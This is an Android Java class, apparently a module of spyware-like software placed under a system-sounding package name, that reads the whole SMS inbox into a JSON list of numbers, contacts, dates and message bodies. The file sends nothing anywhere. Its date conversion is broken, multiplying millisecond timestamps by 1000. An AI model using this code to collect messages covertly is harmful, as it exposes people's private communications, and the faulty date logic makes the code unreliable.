package oom.android.system.Managers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;
import java.util.List;

public class SmsManager {

    Context context;

    public SmsManager(Context context1){
        this.context=context1;
    }



    public JSONObject getSMSList(){

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                String person = cur.getString(cur.getColumnIndexOrThrow("person"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                Long epoch = Long.parseLong(date);
                Date fDate = new Date(epoch * 1000);
                date = fDate.toString();
                sms.put("phoneNumber" , address);
                sms.put("date",date);
                sms.put("person",person);
                sms.put("msg" , body);
                list.put(sms);

            }
            SMSList.put("smsList", list);
            Log.e("done" ,"collecting");
            cur.close();
            return SMSList;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }

}
